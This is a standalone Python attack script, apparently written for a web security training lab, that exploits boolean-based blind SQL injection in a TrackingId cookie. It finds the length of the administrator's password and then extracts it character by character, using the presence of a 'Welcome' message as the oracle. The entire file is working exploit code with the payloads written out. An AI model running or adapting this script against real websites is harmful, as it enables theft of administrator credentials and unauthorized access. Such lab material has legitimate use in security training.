# Get password through Cookies and Blind SQLi statements
import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_cookies(url):
	r = requests.get(url, verify=False)
	get_cookies = r.cookies
	trackingId = get_cookies.get('TrackingId')
	session = get_cookies.get('session')
	cookies = [trackingId, session]
	return cookies

def get_length_password(url, get_cookies):
	for i in range(1, 50):
		payload = f"' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>{i})='administrator'--"
		payload_encode = urllib.parse.quote(payload)
		cookies = {'TrackingId':get_cookies[0] + payload_encode, 'session':get_cookies[1]}
		r = requests.get(url, cookies=cookies, verify=False)
		if "Welcome" not in r.text:
			return i + 1

def sqli_payload(url):
	g_cookies = get_cookies(url)
	length_password = get_length_password(url, g_cookies)
	password = "\033[34m[+] Password:\033[0m "
	for i in range(1, length_password):
		for j in range(32, 126):
			payload = f"' AND (SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username='administrator')='{j}'--"
			payload_encode = urllib.parse.quote(payload)
			cookies = {'TrackingId':g_cookies[0] + payload_encode, 'session':g_cookies[1]}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			if "Welcome" not in r.text:
				sys.stdout.write('\r' + password + chr(j))
				sys.stdout.flush()
			else:
				password += chr(j)
				sys.stdout.write('\r' + password)
				sys.stdout.flush()
				break

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} https://www.example.com\033[0m')
		sys.exit(1)

	try:
		print(f'\033[32m[+] Retrieving administrator password...\033[0m')
		sqli_payload(url)
		if sqli_payload:
			print(f'\n\033[32m[+] Blind SQLi successful!\033[0m')
		else:
			print(f'\033[31m[+] Blind SQLi unsuccessful!!!\033[0m')
	except KeyboardInterrupt:
		print(f'\n\033[33m[+] Exited...\033[0m')
